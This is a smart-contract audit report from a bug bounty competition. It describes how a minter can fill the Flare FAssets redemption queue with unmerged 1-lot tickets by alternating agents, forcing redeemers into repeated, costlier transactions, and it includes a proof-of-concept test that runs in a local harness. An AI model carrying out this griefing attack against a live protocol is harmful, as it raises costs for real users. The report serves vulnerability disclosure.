# #45987 \[SC-Medium] A malicious user can fill up the redemption queue with the minimum size (1 lot), making legitimate redeemers to redeem always multiple times

**Submitted on May 23rd 2025 at 09:48:01 UTC by @avoloder for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #45987
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/facets/CollateralReservationsFacet.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A malicious user could easily fill up the redemption queue making it hard for legitimate redeemers to redeem in one go

## Vulnerability Details

A malicious minter (e.g., Minter 1) could fill up the redemption queue with minimum-sized tickets (1 lot each), effectively reserving collateral multiple times in small increments. Each time collateral is reserved, a new ticket is created in the redemption queue.

To prevent the protocol from aggregating values under a single agent (which would consolidate tickets), Minter 1 can alternate between two or more different agents when reserving collateral. Since each ticket comes from a different agent, the system will not merge the values, and a new ticket will be created for each reservation.

On the redemption side, when a legitimate user submits a redemption request, the system sums ticket values until the requested number of lots is reached. The corresponding tickets are then removed from the queue, and the assets are redeemed. This process continues until either the redemption is fulfilled or the protocol hits the maximumRedeemedTickets constraint.

Because the queue is filled with many 1-lot tickets, a legitimate redeemer will likely hit the maximumRedeemedTickets limit before completing their full redemption. As a result, the redemption will be incomplete, and the user will need to repeat the process multiple times. Depending on the total number of lots the user intends to redeem, this fragmentation could force them to perform several separate redemption transactions

## Impact Details

This fragmentation forces the user to execute multiple redemption transactions, each processing a limited number of tickets. As a result, the user incurs significantly higher cumulative gas fees and increased transaction latency due to repeated interactions with the protocol.

Furthermore, protocol's resources are being used inefficiently by handling many small tickets rather than fewer aggregated ones.

## References

Add any relevant links to documentation or code

<https://github.com/flare-foundation/fassets/blob/fc727ee70a6d36a3d8dec81892d76d01bb22e7f1/contracts/assetManager/library/RedemptionRequests.sol#L32-L66>

<https://github.com/flare-foundation/fassets/blob/fc727ee70a6d36a3d8dec81892d76d01bb22e7f1/contracts/assetManager/library/Agents.sol#L186-L228>

## Proof of Concept

## Proof of Concept

Paste this test into AttackScenarios.ts

```solidity
it("malicious user can fill the queue with the minimum size (1 lot), preventing legitimate redeemers to redeem more than maxRedeemedTickets and cause multiple RedemptionRequestIncomplete requests", async() => {
        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
        const agent2 = await Agent.createTest(context, agentOwner2, underlyingAgent2);
        const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(10000));
        const minter2 = await Minter.createTest(context, minterAddress2, underlyingMinter2, context.underlyingAmount(10000));
        const redeemer = await Redeemer.create(context, redeemerAddress1, underlyingRedeemer1);

        // make agents available
        const fullAgentCollateral = toWei(3e8);
        await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
        await agent2.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);

        // update block
        await context.updateUnderlyingBlock();
        // perform minting
        const lots = 1;

        // A malicious minter performs mints simultaneously so that the ticket value cannot be aggregated for the same agent

        // First round with Agent 1
        const crt = await minter.reserveCollateral(agent.vaultAddress, lots);
        const txHash = await minter.performMintingPayment(crt);
        const minted = await minter.executeMinting(crt, txHash);
        // Second round with Agent 2
        const crt2 = await minter.reserveCollateral(agent2.vaultAddress, lots);
        const txHash2 = await minter.performMintingPayment(crt2);
        const minted2 = await minter.executeMinting(crt2, txHash2);
        // Third round with Agent 1
        const crt3 = await minter.reserveCollateral(agent.vaultAddress, lots);
        const txHash3 = await minter.performMintingPayment(crt3);
        const minted3 = await minter.executeMinting(crt3, txHash3);
        // Fourth round with Agent 2
        const crt4 = await minter.reserveCollateral(agent2.vaultAddress, lots);
        const txHash4 = await minter.performMintingPayment(crt4);
        const minted4 = await minter.executeMinting(crt4, txHash4);

        //Verify redemption queue (number of tickets = 4) => 4 distinct tickets (each with 1 lot size)
        console.log(deepFormat(await context.getRedemptionQueue()));

        // Legitimate minter mints 6 lots

        const crt5 = await minter2.reserveCollateral(agent.vaultAddress, lots * 5);
        const txHash5 = await minter2.performMintingPayment(crt5);
        const minted5 = await minter2.executeMinting(crt5, txHash5);

        //Verify redemption queue (number of tickets = 4) => 4 distinct tickets (each with 1 lot size)
        console.log(deepFormat(await context.getRedemptionQueue()));

        // redeemer "buys" f-assets
        await context.fAsset.transfer(redeemer.address, minted5.mintedAmountUBA, { from: minter2.address });

        // Redeemer tries to reedem his assets
        // perform redemption
        const [redemptionRequests, remainingLots, dustChanges] = await redeemer.requestRedemption(lots * 5);

        console.log(deepFormat(await context.getRedemptionQueue()));
        assertWeb3Equal(remainingLots, 1);
    });
```
